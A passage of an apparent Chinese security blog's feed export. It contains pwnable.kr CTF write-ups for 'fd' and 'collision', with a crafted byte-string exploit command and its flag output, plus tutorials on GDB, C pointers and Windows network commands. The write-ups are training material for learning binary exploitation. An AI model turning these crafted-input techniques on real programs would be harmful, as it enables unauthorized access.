b（byte）：字节（8位）h（halfword）：半字（16位）w（word）：字（32位）g（giant word）：双字（64位） o（octal） 八进制x（hexadecimal）十六进制 d（decimal） 十进制u（unsigned decimal） 无符号十进制t（binary） 二进制 f（floating point ）浮点数 a（address） 地址 c（char） 字符 s（string） 字符串 i（instruction） 指令 任意长度 地址参数相关说明： 地址可为表达式/直接地址，其结果为内存地址。例如可用寄存器（$eip）或伪寄存器（$pc）。若x指令后没有地址表达式，则显示结果为上一次地址。 四、参考文章GDB常用命令 - 内存查看 五、GDB其他命令]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（二）[collision]]]></title>
    <url>%2F2020%2F04%2F23%2F2020.04.24%EF%BC%88109%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识1.PwnTools工具的使用 这个知识点再单独进行总结 2.字符串强制转换为数字 可以从下面题目中的例子发现 3.python -c的功能 Specify the command to execute. This terminates the option list (following options are passed as arguments to the command). 指定要执行的命令。这将终止选项列表 (紧跟的选项作为参数传递给命令) 4.shell命令中``和$的作用 反引号在Linux shell命令行中有特殊的含义：反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。比如： 12[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/`uname -r`[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]# 或者是 12[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/$(uname -r)[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]# 0x01 题目分析1ssh col@pwnable.kr -p2222 连上服务器之后，查看一下有什么文件以及相关的权限： 1234total 16-r-sr-x--- 1 col_pwn col 7341 Jun 11 2014 col-rw-r--r-- 1 root root 555 Jun 12 2014 col.c-r--r----- 1 col_pwn col_pwn 52 Jun 11 2014 flag 和上个题目一样，我们接着看看col.c文件中的源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; **下面就来分析一下源码**： 1234 if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0;&#125; 和第一题一样，要求我们输入的参数不能小于1个（因为还有1个是程序名自身） 1234if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0;&#125; 我们输入的第一个参数的长度要为20字节，否则就会终止程序 123456if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0;&#125;else printf("wrong passcode.\n"); 这是最关键的一段代码，要求hashcode == check_password( argv[1] )，也就是说我们输入的参数在经过函数check_password()之后的结果要于hashcode同值同类型，下面是hashcode和check_password()函数的源码： 12345678910unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125; 从第2行和第3行来看，可以看出来将我们输入的参数（string）强制转化为了int类型，下面我们看一下这里的汇编代码： 123456789101112131415161718192008048494 &lt;check_password&gt;: 8048494: 55 push %ebp 8048495: 89 e5 mov %esp,%ebp 8048497: 83 ec 10 sub $0x10,%esp 804849a: 8b 45 08 mov 0x8(%ebp),%eax 804849d: 89 45 fc mov %eax,-0x4(%ebp) 80484a0: c7 45 f8 00 00 00 00 movl $0x0,-0x8(%ebp) 80484a7: c7 45 f4 00 00 00 00 movl $0x0,-0xc(%ebp) 80484ae: eb 12 jmp 80484c2 &lt;check_password+0x2e&gt; 80484b0: 8b 45 f4 mov -0xc(%ebp),%eax 80484b3: c1 e0 02 shl $0x2,%eax 80484b6: 03 45 fc add -0x4(%ebp),%eax 80484b9: 8b 00 mov (%eax),%eax 80484bb: 01 45 f8 add %eax,-0x8(%ebp) 80484be: 83 45 f4 01 addl $0x1,-0xc(%ebp) 80484c2: 83 7d f4 04 cmpl $0x4,-0xc(%ebp) 80484c6: 7e e8 jle 80484b0 &lt;check_password+0x1c&gt; 80484c8: 8b 45 f8 mov -0x8(%ebp),%eax 80484cb: c9 leave 80484cc: c3 ret 将上图的汇编代码用图示表示如下： 附：我已经将PPT上传到百度云，有兴趣的可以下载下载链接（提取码: ra6q） 可以从汇编代码中可以看出，check_password()函数将我们输入的长度为20的字符串，按照每4个唯一单位，分为5次相加，所得到的结果要等于0x21DD09EC 0x02 解题步骤 该题最重要的是如何将我们输入的字符串按照每四个的长度相加等于0x21DD09EC，十进制为568134124 思路： 将568134124/5，得到113626824.8，明显不能整除 求的余数为：568134124 - 113626824*4 = 113626828 所以我们要输入的应该为113626824113626824113626824113626824113626828，其中： 1234&gt;&gt;&gt; hex(113626824)'0x6c5cec8'&gt;&gt;&gt; hex(113626828)'0x6c5cecc' 因为是小段口输入，所以在构造exploit时，要对字符串进行逆转，\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06 构造的exploit如下： 12345./col `python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;`或者是 ./col $(python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;) 0x03 参考文章 pwnable.kr - collision python -c 执行单行命令/脚本，有点意思 Python -c / -m 执行命令 Shell命令中的反引号（`）]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（一）[fd]]]></title>
    <url>%2F2020%2F04%2F23%2F2020.04.23%EF%BC%88108%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识1.atoi()函数 ① atoi函数是包含在stdlib.h标准库中 ② 函数的声明：int atoi(const char* str) ③ 作用：是用来将参数中的str所指向的字符串转化为一个整数 ④ 实例如下： 12345678910111213141516171819#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; char* s1 = "Hello World"; char* s2 = "1234567890"; char* s3 = "Th1s_1s_a_t9st"; char* s4 = "a"; printf("%d\n",atoi(s1)); printf("%d\n",atoi(s2)); printf("%d\n",atoi(s3)); printf("%d\n",atoi(s4)); return 0;&#125;// 输出结果为：// 0// 1234567890// 0 所以说对于atoi函数的返回值来说：该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。其实也可以理解为将纯数字的字符串转化为数值，含有其他符号的字符串将返回0。 2.read()函数 ① read函数被包含在unistd.h标准库中 ② read函数的声明：ssize_t read(int fd, void *buf, size_t count); 12345这里要解释一下fd文件描述符的作用： 在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。 程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。 ③ read函数的解释：read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动 ④ read函数的返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0 3.C函数中main函数的参数 表示形式： 1int main(int argc,char *argv[]) = int main(int argc,char **argv) 其参数argc和argv用于运行时,把命令行参数传入主程序.其中ARG是指arguments,即参数.具体含义如下: **int argc:英文名为arguments count(参数计数)** *count of cmd line args,运行程序传送给main函数的命令行参数总个数,包括可执行程序名,其中当argc=1时表示只有一个程序名称,此时存储在argv[0]中. **char \*\*argv:英文名为arguments value/vector(参数值)** pointer to table of cmd line args,字符串数组,用来存放指向字符串参数的指针数组,每个元素指向一个参数,空格分隔参数,其长度为argc.数组下标从0开始,argv[argc]=NULL. argv[0] 指向程序运行时的全路径名 argv[1] 指向程序在DOS命令中执行程序名后的第一个字符串 argv[2] 指向执行程序名后的第二个字符串 argv[argc] 为NULL 实例如下： 12345678910111213#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char** argv)&#123; int i; printf("argc is %d\n",argc); for(i = 0;i&lt;argc;i++)&#123; printf("%d:",i); printf("%s\n",argv[i]); &#125; system("PAUSE"); return 0;&#125; 执行./test 1 2 3 A B C得到如下的结果： 12345678argc is 70:./test1:12:23:34:A5:B6:C 0x01 题目分析1ssh fd@pwnable.kr -p2222 链接上去之后，查看一下相关的文件以及权限：ls -l，得到如下结果： 1234total 16-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd-rw-r--r-- 1 root root 418 Jun 11 2014 fd.c-r--r----- 1 fd_pwn root 50 Jun 11 2014 flag 可以看出只有fd文件可执行，fd.c文件对root可读可写，那下面我们打开fd.c文件，分析一下源码，上源码！ 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 下面就来分析一下上述的源码： 1234if(argc&lt;2)&#123; printf(&quot;pass argv[1] a number\n&quot;); return 0;&#125; 上面的 if 语句是用来判断执行fd文件的参数，如果小于2则终止程序。 1int fd = atoi( argv[1] ) - 0x1234; 利用atoi函数用来计算read函数中的fd，fd是第2个参数，也就是输入的第一个参数减去0x1234（十进制为4660）的值 1len = read(fd, buf, 32); 把fd指向的文件中，读取32个字节到buf数组中，我们希望fd为0，因为当fd=0时，我们就可以从键盘输入字符串，那么就能把字符串输入到buf数组里。 12345if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123; printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0);&#125; 判断我们输入的串是否与”LETMEWIN”一样，若LETMEWIN = buf，则执行if条件语句，也就是说我们输入的字符串为”LETMEWIN” 0x02 解题步骤1234567891011121314151617181920root@木子冰:# ssh fd@pwnable.kr -p2222fd@pwnable.kr&apos;s password:guest ____ __ __ ____ ____ ____ _ ___ __ _ ____| \| |__| || \ / || \ | | / _] | |/ ]| \| o ) | | || _ || o || o )| | / [_ | &apos; / | D )| _/| | | || | || || || |___ | _] | \ | /| | | ` &apos; || | || _ || O || || [_ __ | \| \| | \ / | | || | || || || || || . || . \|__| \_/\_/ |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|fd@pwnable:~$ ls -ltotal 16-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd-rw-r--r-- 1 root root 418 Jun 11 2014 fd.c-r--r----- 1 fd_pwn root 50 Jun 11 2014 flagfd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!! 0x03 参考文章 pwnable第一关fd [C/C++基础知识] main函数的参数argc和argv 每天进步一点点——Linux中的文件描述符与打开文件之间的关系]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解pointer（指针）中的“*”（取值）和“&”（取地址）]]></title>
    <url>%2F2020%2F03%2F30%2F2020.03.30%EF%BC%88107%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;今天要好好的解析以下C/C++中的“*”和“&amp;”的区别，示例代码如下： 12345678910111213#include&lt;stdio.h&gt;void main()&#123; int b = 2; int* a = &amp;b; printf("a:%d\n",a); printf("*a:%d\n",*a); printf("&amp;a:%d\n",&amp;a); printf("*&amp;a:%d\n",*&amp;a); printf("**&amp;a:%d\n",**&amp;a); printf("&amp;b:%d\n",&amp;b); printf("*&amp;b:%d\n",*&amp;b);&#125; 如果以前看到这么多“*”和“\&amp;”符号]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows常用的网络命令（web）]]></title>
    <url>%2F2020%2F03%2F26%2F2020.03.26%EF%BC%88106%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 ipconfig作用：可以使用 ipconfig 命令获得主机配置信息，包括 IP 地址、子网掩码和默认网关 IPConfig实用程序和它的等价图形用户界面——Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。 IPConfig最常用的选项： ▧ ipconfig：当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。 ▧ ipconfig /all：当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。 ▧ ipconfig /release和ipconfig /renew：这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。 0x01 pingPing是个使用频率极高的实用程序，用于确定本地主机是否能与另一台主机交换（发送与接收）数据报。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。 如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。 按照缺省设置，Windows上运行的Ping命令发送4个ICMP回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。 **1、通过Ping检测网络故障的典型次序** 正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障： ▧ ping 127.0.0.1 这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。 ▧ ping 本机IP 这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。 ▧ ping 局域网内其他IP 这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。 ▧ ping 网关IP 这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。 ▧ ping 远程IP 如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题） ▧ ping localhost localhost是个作系统的网络保留名，它是127.0.0.1的别名，每台计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。 ▧ ping www.xxx.com（如www.yesky.com 天极网） 对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。 如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。 **2、Ping命令的常用参数选项** (您可以使用 Ping 命令的不同选项来指定要使用的数据包大小、要发送多少数据包、是否记录用过的路由、要使用的生存时间 (TTL) 值以及是否设置“不分段”标志。可以键入 ping -? 查看这些选项。) ▧ ping IP –t 连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。 ▧ ping IP -l 300 指定Ping命令中的数据长度为300字节，而不是缺省的32字节。 ▧ ping IP –n 执行特定次数的Ping命令。 下例说明如何向 IP 地址 172.16.48.10 发送两个 Ping，每个都是 1,450 字节：C:\&gt;ping -n 2 -l 1450 172.16.48.10 默认情况下，在显示“请求超时”之前，Ping 等待 1,000 毫秒（1 秒）的时间让每个响应返回。如果通过 Ping 探测的远程系统经过长时间延迟的链路，如卫星链路，则响应可能会花更长的时间才能返回。可以使用 -w （等待）选项指定更长时间的超时。 0x02 arp使用 Arp 解决硬件地址问题 ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。 按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。 **ARP常用命令选项：** ▧ arp -a或arp –g：用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。 ▧ arp -a IP：如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。 ▧ arp -s IP 物理地址：我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。 ▧ arp -d IP：使用本命令能够人工删除一个静态项目。 例如我们在命令提示符下，键入 Arp –a；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项： Interface:10.0.0.1 on interface 0x1 Internet Address Physical Address Type 10.0.0.99 00-e0-98-00-7c-dc dynamic 在此例中，缓存项指出位于 10.0.0.99的远程主机解析成 00-e0-98-00-7c-dc的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。 至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。 0x03 netstat 使用 netstat 显示连接统计，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。 如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。 **1.netstat 的一些常用选项** ▧ netstat –s：本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 ▧ netstat –e：本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。 ▧ netstat –r：本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的信息。除了显示有效路由外，还显示当前有效的连接。 ▧ netstat –a：本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。 ▧ netstat –n：显示所有已建立的有效连接。 **2.Netstat的妙用** 经常上网的人一般都使用QQ的，不会遇到被一些讨厌的人骚扰，想投诉却又不知从何下手的情况。其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但如果对方在设置QQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。我们只需要通过Netstat就可以很方便的做到这一点：当他通过QQ或其他的工具与我们相连时（例如我们给他发一条QQ信息或他给我们发一条信息），我们立刻在DOS命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。 0x04 tracert 使用tracert跟踪网络连接。如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标IP地址的路径并记录结果。tracert命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。 Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。Tracert 实用程序对于解决大网络问题非常有用，此时可以采取几条路径到达同一个点。 **tracert 最常见的用法**： ▧ tracert IP address [-d]该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。 说明：通过向目标发送不同 IP 生存时间 (TTL) 值的“Internet 控制消息协议 (ICMP)”回应数据包，Tracert 诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的 TTL 递减 1。数据包上的 TTL 减为 0 时，路由器应该将“ICMP 已超时”的消息发回源系统。Tracert 先发送 TTL 为 1 的回应数据包，并在随后的每次发送过程将 TTL 递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。通过检查中间路由器发回的“ICMP 已超时”的消息确定路由。某些路由器不经询问直接丢弃 TTL 过期的数据包，这在Tracert 实用程序中看不到。 Tracert 命令按顺序打印出返回“ICMP 已超时”消息的路径中的近端路由器接口列表。如果使用 -d 选项，则 Tracert 实用程序不在每个 IP 地址上查询 DNS。 Tracert 命令行选项：Tracert 命令支持多种选项，如下表所示： tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name **选项描述：** -d 指定不将 IP 地址解析到主机名称。 -h maximum_hops 指定跃点数以跟踪到称为 target_name 的主机的路由。 -j host-list 指定 Tracert 实用程序数据包所采用路径中的路由器接口列表。 -w timeout 等待 timeout 为每次回复所指定的毫秒数。 target_name 目标主机的名称或 IP地址。 0x05 route 大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。 一般使用选项： ▧ route print：本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。 ▧ route add：使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络209.98.32.33的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为202.96.123.5，子网掩码为255.255.255.224，那么我们应该输入以下命令：route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5 ▧ route change：我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径：route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3 ▧ route delete：使用本命令可以从路由表中删除路由。例如：route delete 209.98.32.33。 0x06 pathping使用 pathping 测试路由器。pathping 命令是一个路由跟踪工具，它将 ping 和 tracert 命令的功能和这两个工具所不提供的其他信息结合起来。pathping 命令在一段时间内将数据包发送到到达最终目标的路径上的每个路由器，然后基于数据包的计算机结果从每个跃点返回。由于命令显示数据包在任何给定路由器或链接上丢失的程度，因此可以很容易地确定可能导致网络问题的路由器或链接。某些选项是可用的，如下表所示。 选项 名称 功能 -n Hostnames 不将地址解析成主机名 -h Maximum hops 搜索目标的最大跃点数 -g Host-list 沿着路由列表释放源路由 -p Period 在 ping 之间等待的毫秒数 -q Num_queries 每个跃点的查询数 -w Time-out 为每次回复所等待的毫秒数 -T Layer 2 tag 将第 2 层优先级标记 -R RSVP isbase Che 检查路径中的路由器是否支持“资源保留协议”,允许主机为数据流保留一定量带宽 对于-T:（例如，对于 IEEE 802.1p）连接到数据包并将它发送到路径中的每个网络设备。这有助于标识没有正确配置第 2 层优先级的网络设备。-T 开关用于测试服务质量 (QoS) 连通性。 对于-R： 开关用于测试服务质量 (QoS) 连通性。 ==默认的跃点数是 30，并且超时前的默认等待时间是 3 秒。默认时间是 250 毫秒，并且沿着路径对每个路由器进行查询的次数是 100。== 当运行 pathping 时，在测试问题时首先查看路由的结果。此路径与 tracert 命令所显示的路径相同。然后 pathping 命令对下一个 125 毫秒显示忙消息（此时间根据跃点计数变化）。在此期间，pathping 从以前列出的所有路由器和它们之间的链接之间收集信息。在此期间结束时，它显示测试结果。 最右边的两栏 This Node/Link Lost/Sent=Pct 和 Address 包含的信息最有用。172.16.87.218（跃点 1）和 192.68.52.1（跃点 2）丢失 13% 的数据包。 所有其他链接工作正常。在跃点 2 和 4 中的路由器也丢失寻址到它们的数据包（如 This Node /Link 栏中所示），但是该丢失不会影响转发的路径。 对链接显示的丢失率（在最右边的栏中标记为 |）表明沿路径转发丢失的数据包。该丢失表明链接阻塞。对路由器显示的丢失率（通过最右边栏中的 IP 地址显示）表明这些路由器的 CPU 可能超负荷运行。这些阻塞的路由器可能也是端对端问题的一个因素，尤其是在软件路由器转发数据包时。 0x07 NBTStat使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。 **常用选项**： nbtstat –n：显示寄存在本地的名字和服务程序。 nbtstat –c：本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于存放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。 nbtstat –r：本命令用于清除和重新加载NetBIOS名字高速缓存。 nbtstat -a IP：通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。 nbtstat -s IP：显示实用其IP地址的另一台计算机的NetBIOS连接表。 例如我们在命令提示符下，键入：nbtstat –RR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>知识库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-根目录详解（二进制）]]></title>
    <url>%2F2020%2F03%2F21%2F2020.03.21%EF%BC%88105%EF%BC%89%2F</url>
